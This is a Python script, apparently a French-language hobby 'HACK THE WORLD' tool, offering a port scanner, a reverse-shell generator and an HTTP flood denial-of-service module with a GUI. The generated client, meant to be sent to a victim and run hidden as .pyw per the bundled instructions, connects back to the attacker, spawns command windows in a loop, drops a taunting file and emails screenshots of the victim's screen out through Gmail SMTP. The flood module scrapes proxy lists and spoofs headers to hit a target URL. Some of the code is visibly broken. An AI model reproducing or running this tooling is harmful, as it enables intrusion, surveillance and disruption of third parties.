import pyfiglet
import socket
import ctypes
from pathlib import Path
import sys
import requests
import asyncio
import aiohttp
import random
import re
import itertools
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QMessageBox, QTextEdit
)
from PyQt5.QtGui import QPixmap, QPalette, QColor
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from io import BytesIO
import httpx
import csv
import signal
import pandas as pd
import os
import re
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from json import loads as json_loads
from time import monotonic
from typing import Optional

import requests
from requests_futures.sessions import FuturesSession

from sherlock_project.__init__ import (
    __longname__,
    __shortname__,
    __version__,
    forge_api_latest_release,
)

from sherlock_project.result import QueryStatus
from sherlock_project.result import QueryResult
from sherlock_project.notify import QueryNotify
from sherlock_project.notify import QueryNotifyPrint
from sherlock_project.sites import SitesInformation
from colorama import init
from argparse import ArgumentTypeError

while True:
    print(pyfiglet.figlet_format("HACK THE WORLD ( HTW )", font="slant"))
    print("1.------ ip scanner ------")
    print("2.---reverse shell maker--")
    print("3.------Dos-site-web------")
    print("4.-----afficher-mon-ip----")
    print("5.-obtenir-les-instructions-du-reverse-shell-")
    print("           ")
    print("ce tool a été créé a but éducatif, je ne suis pas responsable de ce que vous faite avec")

    choix = input("choisis une option : ")
    if choix == "1":
        ip = input("entrez l'adresse ip a tester :")
        ports = [22, 23, 21, 25, 53, 80, 443, 110, 143, 3306, 3389, 5900, 8080]
        portsouverts = []
        portatester = input("souhaitez vous tester tous les ports ? oui/non :")
        if portatester == "oui":
            print("le scan va etre très long (15 a 20 minutes ou plus, je l'ai pas encore optimisé)")
        
        for port in range(1, 65536):
            s = socket.socket()
            s.settimeout(0.2)
            resultat = s.connect_ex((ip, port))
        
            if resultat == 0:
                print ("port", port ,"ouvert")
                portsouverts.append(port)
        
            else:
                print ("port", port ,"fermé")

            s.close()

        if portatester == "non":
            for port in ports:
                s = socket.socket()
                s.settimeout(0.2)
                resultat = s.connect_ex((ip, port))
        
                if resultat == 0:
                    print ("port", port ,"ouvert")
                    portsouverts.append(port)
        
                else:
                    print ("port", port ,"fermé")

                s.close()
                print ("\nPorts ouverts :", portsouverts)

    if choix == "2":
        print("bienvenue dans le créateur de reverse shell\n\n")
        print("voulez vous le client (partie a envoyer a la victime) ou le serveur\n")
        clientouserveur=input("c / s :")

        if clientouserveur == "c":
            def get_desktop():
                # Méthode Windows universelle (toutes langues, même Bureau déplacé)
                try:
                    CSIDL_DESKTOP = 0
                    buf = ctypes.create_unicode_buffer(260)
                    ctypes.windll.shell32.SHGetFolderPathW(None, CSIDL_DESKTOP, None, 0, buf)
                    return Path(buf.value)
                except Exception:
                    # Fallback si jamais la méthode Windows échoue
                    home = Path.home()
                    for name in ("Desktop", "Bureau"):
                        candidate = home / name
                        if candidate.exists():
                            return candidate
                    raise FileNotFoundError("Impossible de trouver le Bureau.")

            # Ton code Python à écrire dans le fichier
            code = """
    import socket
    import subprocess
    import winreg
    import ctypes
    from PIL import ImageGrab
    import smtplib
    from email.message import EmailMessage

    def take_screenshot(path="screen.png"):
        img = ImageGrab.grab()
        img.save(path)
        return path

    def send_mail_with_attachment(to, subject, body, file_path):
        msg = EmailMessage()
        msg["From"] = "ton_adresse@mail.com"
        msg["To"] = to
        msg["Subject"] = subject
        msg.set_content(body)

        with open(file_path, "rb") as f:
            data = f.read()
            msg.add_attachment(data, maintype="image", subtype="png", filename="screen.png")

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login("ton_adresse@mail.com", "TON_MOT_DE_PASSE_APP")
            smtp.send_message(msg)

    def set_black_wallpaper():
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Control Panel\Colors",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "Background", 0, winreg.REG_SZ, "0 0 0")
        winreg.CloseKey(key)

        key2 = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Control Panel\Desktop",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key2, "WallpaperStyle", 0, winreg.REG_SZ, "0")
        winreg.SetValueEx(key2, "Wallpaper", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key2)

        ctypes.windll.user32.SystemParametersInfoW(20, 0, "", 3)

    client = socket.socket()
    client.connect(("ip de l'attaquant", 5000))

    while True:
        print("pong___________heure___________quit")
        envoyer = input("que souhaitez vous envoyer :")
        client.send(envoyer.encode())
        reponse = client.recv(1024).decode()
        print(reponse)
        if reponse == "calc":
            subprocess.Popen("calc.exe")
        elif reponse == "3917":
            while True :
                subprocess.Popen("cmd")
        elif reponse == "secret":
            with open("liscaattentivement.txt", "w") as f:
                f.write("j'ai l'acces a ton pc fdp\n")
            with open("monfichier.txt", "r") as f:
                contenu = f.read()
                print(contenu)
        elif reponse == "secret2":
            p = subprocess.Popen(
            ["cmd.exe"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
            p.stdin.write("dir\n")
            p.stdin.flush()
            output = p.stdout.read()
            print(output)

        elif reponse == "larp":
            subprocess.run("dir/s", shell=True)

        elif reponse == "uhq":
            set_black_wallpaper()

        elif reponse == "scr":
            path = take_screenshot()
            send_mail_with_attachment(
            to="destinataire@mail.com",
            subject="Screenshot",
            body="Voici le screen demandé.",
            file_path=path
        )







        break
    client.close()"""

            # Création du fichier
            desktop = get_desktop()
            fichier = desktop / "script_genere.py"
            fichier.write_text(code, encoding="utf-8")

            print("Fichier créé :", fichier)

        if clientouserveur == "s":
            def get_desktop():
                # Méthode Windows universelle (toutes langues, même Bureau déplacé)
                try:
                    CSIDL_DESKTOP = 0
                    buf = ctypes.create_unicode_buffer(260)
                    ctypes.windll.shell32.SHGetFolderPathW(None, CSIDL_DESKTOP, None, 0, buf)
                    return Path(buf.value)
                except Exception:
                    # Fallback si jamais la méthode Windows échoue
                    home = Path.home()
                    for name in ("Desktop", "Bureau"):
                        candidate = home / name
                        if candidate.exists():
                            return candidate
                    raise FileNotFoundError("Impossible de trouver le Bureau.")

            code = """import socket
    import threading

    server = socket.socket()
    server.bind(("192.168.1.32", 5000))
    server.listen()

    client, addr= server.accept()
    print("client connécté", addr)

    def recevoir():
        while True:
            messageami = client.recv(1024).decode()
            print("\\na", messageami)
            if not messageami:
                break

    def envoyer():
        while True:
            message = input("que souhaitez vous repondre :")
            client.send(message.encode())
            if not message:
                break

    threading.Thread(target=recevoir).start()
    threading.Thread(target=envoyer).start()
    """
            # Création du fichier
            desktop = get_desktop()
            fichier = desktop / "script_genere.py"
            fichier.write_text(code, encoding="utf-8")

            print("Fichier créé :", fichier)

    if choix =="3":
        UserAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux i645 ) AppleWebKit/601.39 (KHTML, like Gecko) Chrome/52.0.1303.178 Safari/600",     
        "Mozilla/5.0 (Windows; U; Windows NT 6.2; x64; en-US) AppleWebKit/603.16 (KHTML, like Gecko) Chrome/49.0.3596.149 Safari/602",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_12_8) AppleWebKit/537.8 (KHTML, like Gecko) Chrome/51.0.3447.202 Safari/533",
        "Mozilla/5.0 (U; Linux x86_64; en-US) AppleWebKit/535.12 (KHTML, like Gecko) Chrome/54.0.2790.274 Safari/601",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 7_5_1) AppleWebKit/534.29 (KHTML, like Gecko) Chrome/54.0.2941.340 Safari/602",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_4_2) AppleWebKit/602.18 (KHTML, like Gecko) Chrome/47.0.1755.159 Safari/600",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_4; like Mac OS X) AppleWebKit/601.29 (KHTML, like Gecko)  Chrome/47.0.1661.149 Mobile Safari/536.4",
        "Mozilla/5.0 (Linux; Android 5.1; SM-G9350T Build/LMY47X) AppleWebKit/602.21 (KHTML, like Gecko)  Chrome/50.0.1176.329 Mobile Safari/535.9",
        "Mozilla/5.0 (Linux; U; Android 6.0.1; HTC One M8 Build/MRA58K) AppleWebKit/600.36 (KHTML, like Gecko)  Chrome/53.0.3363.154 Mobile Safari/537.2",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_8_3) Gecko/20100101 Firefox/50.7",
        "Mozilla/5.0 (U; Linux i671 x86_64) AppleWebKit/535.27 (KHTML, like Gecko) Chrome/54.0.1417.286 Safari/537",
        "Mozilla/5.0 (iPad; CPU iPad OS 9_4_4 like Mac OS X) AppleWebKit/536.12 (KHTML, like Gecko)  Chrome/55.0.1687.155 Mobile Safari/600.8",
        "Mozilla/5.0 (Linux; Android 4.4.1; LG-V510 Build/KOT49I) AppleWebKit/535.28 (KHTML, like Gecko)  Chrome/52.0.2705.296 Mobile Safari/602.9",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/54.0.2084.216 Safari/603.3 Edge/8.91691",
        "Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.0; WOW64; en-US Trident/7.0)",
        ]

        ip_list_urls = [
            "https://www.us-proxy.org",
            "https://www.socks-proxy.net",
            "https://proxyscrape.com/free-proxy-list",
            "https://www.proxynova.com/proxy-server-list/",
            "https://proxybros.com/free-proxy-list/",
            "https://proxydb.net/",
            "https://spys.one/en/free-proxy-list/",
            "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
            "https://hasdata.com/free-proxy-list",
            "https://www.proxyrack.com/free-proxy-list/",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://www.shodan.io/search?query=brazil",
            "https://www.shodan.io/search?query=germany",
            "https://www.shodan.io/search?query=france",
            "https://www.shodan.io/search?query=USA",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://geonode.com/free-proxy-list",
            "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
            "https://www.us-proxy.org",
            "https://www.socks-proxy.net",
            "https://proxyscrape.com/free-proxy-list",
            "https://www.proxynova.com/proxy-server-list/",
            "https://proxybros.com/free-proxy-list/",
            "https://proxydb.net/",
            "https://spys.one/en/free-proxy-list/",
            "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
            "https://hasdata.com/free-proxy-list",
            "https://www.proxyrack.com/free-proxy-list/",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://www.shodan.io/search?query=brazil",
            "https://www.shodan.io/search?query=germany",
            "https://www.shodan.io/search?query=france",
            "https://www.shodan.io/search?query=USA",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://geonode.com/free-proxy-list",
            "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
            "https://www.us-proxy.org",
            "https://www.socks-proxy.net",
            "https://proxyscrape.com/free-proxy-list",
            "https://www.proxynova.com/proxy-server-list/",
            "https://proxybros.com/free-proxy-list/",
            "https://proxydb.net/",
            "https://spys.one/en/free-proxy-list/",
            "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
            "https://hasdata.com/free-proxy-list",
            "https://www.proxyrack.com/free-proxy-list/",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://www.shodan.io/search?query=brazil",
            "https://www.shodan.io/search?query=germany",
            "https://www.shodan.io/search?query=france",
            "https://www.shodan.io/search?query=USA",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://geonode.com/free-proxy-list",
            "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
        

        ]

        class AttackThread(QThread):
            log_signal = pyqtSignal(str)  

            def __init__(self, target_url, num_requests):
                super().__init__()
                self.target_url = target_url
                self.num_requests = num_requests

            async def fetch_ip_addresses(self, url):
                async with aiohttp.ClientSession() as session:
                    try:
                        async with session.get(url) as response:
                            text = await response.text()
                            ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                            return ip_addresses
                    except Exception as e:
                        self.log_signal.emit(f"Error fetching IP list from {url}: {e}")
                        return []

            async def get_all_ips(self):
                tasks = [self.fetch_ip_addresses(url) for url in ip_list_urls]
                ip_lists = await asyncio.gather(*tasks)
                all_ips = [ip for sublist in ip_lists for ip in sublist]
                return all_ips

            async def send_request(self, session, ip_address):
                headers = {
                    "User-Agent": random.choice(UserAgents),
                    "X-Forwarded-For": ip_address
                }
                try:
                    async with session.get(self.target_url, headers=headers) as response:
                        self.log_signal.emit(f"hacktheworld@root {self.target_url} from IP: {ip_address} - Status: {response.status}")
                except Exception as e:
                    self.log_signal.emit(f"Error sending request from IP: {ip_address} - {e}")

            async def attack(self):
                ip_list = await self.get_all_ips()
                ip_cycle = itertools.cycle(ip_list)
                async with aiohttp.ClientSession() as session:
                    tasks = [self.send_request(session, next(ip_cycle)) for _ in range(self.num_requests)]
                    await asyncio.gather(*tasks)

            def run(self):
                asyncio.run(self.attack())

            class MainWindow(QMainWindow):
                def __init__(self):
                    super().__init__()
                    self.setWindowTitle("HACK THE WORLD Dos")
                    self.setGeometry(200, 200, 600, 600)
                    self.setStyleSheet("QMainWindow { border-radius: 2px; }")
                    self.setStyleSheet("background-color: #191919; color: white;")

                    central_widget = QWidget()
                    self.setCentralWidget(central_widget)

                    layout = QVBoxLayout()

                    self.log_output = QTextEdit()
                    self.log_output.setReadOnly(True)
                    self.log_output.setStyleSheet("background-color:#191919; color: red;")
                    layout.addWidget(self.log_output)

                
                    self.image_label = QLabel()
                    self.image_label.setAlignment(Qt.AlignCenter)
                    self.image_label.setStyleSheet("background-color: #191919;")
                    layout.addWidget(self.image_label)
                    
                    image_url = "https://cdn.comparitech.com/wp-content/uploads/2025/10/anonymous.jpg"
                    self.load_image(image_url)
            

                    self.url_label = QLabel("Target URL:")
                    self.url_label.setAlignment(Qt.AlignCenter)  
                    layout.addWidget(self.url_label, alignment=Qt.AlignCenter)

                    self.url_input = QLineEdit()
                    self.url_input.setFixedWidth(300)
                    layout.addWidget(self.url_input, alignment=Qt.AlignCenter)

                    self.requests_label = QLabel("Number of Requests:")
                    self.requests_label.setAlignment(Qt.AlignCenter)  
                    layout.addWidget(self.requests_label)

                    self.requests_input = QLineEdit() 
                    self.requests_input.setFixedWidth(300)
                    layout.addWidget(self.requests_input, alignment=Qt.AlignCenter)  

                    self.start_button = QPushButton("Start")
                    self.start_button.setFixedWidth(100)
                    
                    self.start_button.clicked.connect(self.start_attack)
                    self.start_button.setStyleSheet("background-color: grey; color: white;")
                    layout.addWidget(self.start_button,alignment=Qt.AlignCenter)

                    central_widget.setLayout(layout)

                def log_message(self, message):
                    self.log_output.append(message)

                def load_image(self, image_url):
                    try:
                        response = requests.get(image_url)
                        response.raise_for_status()
                        pixmap = QPixmap()
                        pixmap.loadFromData(BytesIO(response.content).getvalue())
                        self.image_label.setPixmap(pixmap.scaled(400, 400, Qt.KeepAspectRatio))  
                    except Exception as e:
                        self.log_message(f"Error loading image:   {e}")

                def start_attack(self):
                    target_url = self.url_input.text()
                    try:
                        num_requests = int(self.requests_input.text())
                    except ValueError:
                        QMessageBox.critical(self, "Fsociety V3", "Number of requests must be an integer.")
                        return

                    if not target_url or num_requests <= 0:
                        QMessageBox.critical(self, "Fsociety V3", "Please provide a valid URL and number of requests.")
                        return

                    self.log_message("DDoS started.")

                    self.attack_thread = AttackThread(target_url, num_requests)
                    self.attack_thread.log_signal.connect(self.log_message)
                    self.attack_thread.start()
                    QMessageBox.information(self, "HTW", "DDoS started! Check logs.")
            app = QApplication(sys.argv)
            window = MainWindow()
            window.show()
            sys.exit(app.exec_())
    if choix == "4":
        hostname = socket.gethostname()
        ip_locale = socket.gethostbyname(hostname)
        print("IP locale :", ip_locale)

    if choix =="5":
        def get_desktop():
            CSIDL_DESKTOP = 0
            buf = ctypes.create_unicode_buffer(260)
            ctypes.windll.shell32.SHGetFolderPathW(None, CSIDL_DESKTOP, None, 0, buf)
            return Path(buf.value)

        desktop = get_desktop()
        fichier = desktop / "instructions_reverse_shell.txt"
        texte = """BIENVENUE dans les instructions pour faire fonctionner le revrse shell.

        tout d'abord il vous faut le client et le serveur, ensuite si vous voulez que le reverse shell s'éxécute en arriere plan sur le pc de la victime, renommez le client en .pyw 


        comment ca marche ?

        1. téléchargez les deux fichiers
        2. démarrer le serveur depuis un terminal en non en double cliquant dessus
        3. attendre que la victime démarre le client
        4. faites vous plaisir (le reverse shell est a but éducatif, je décline toutes résponsabilité de ce que vous ferez avec)

        quelles sont les commandes disponibles ?

        le tool n'étant pas fini, il n'y a pas énormément de commandes pour l'instant.

        commandes disponibles:
        
            -calc: ouvre la calculatrice a distance
            -3917: ouvre des terminaux en boucle
            -secret: crée un fichier et écrit "j'ai l'acces a ton pc fdp" dedans
            -secret2: ouvre un terminal et fait dir
            -larp: ouvre un terminal et fait dir\s
            -uhq: change le fond d'écran pas un fond d'écran tout noir
            -scr: fais un screenshot et l'envoie sur une adresse mail (veuillez configurez cette option directement dans le code)


        MERCI de faire confiance au tool "HACK THE WORLD", pour l'instant c'est seulement un petit projet sur mon temps libre d'ado de troisième mais plus tard ça deviendra un grand tool."""
        fichier.write_text(texte, encoding="utf-8")

        print("Fichier créé sur le bureau :", fichier)





    

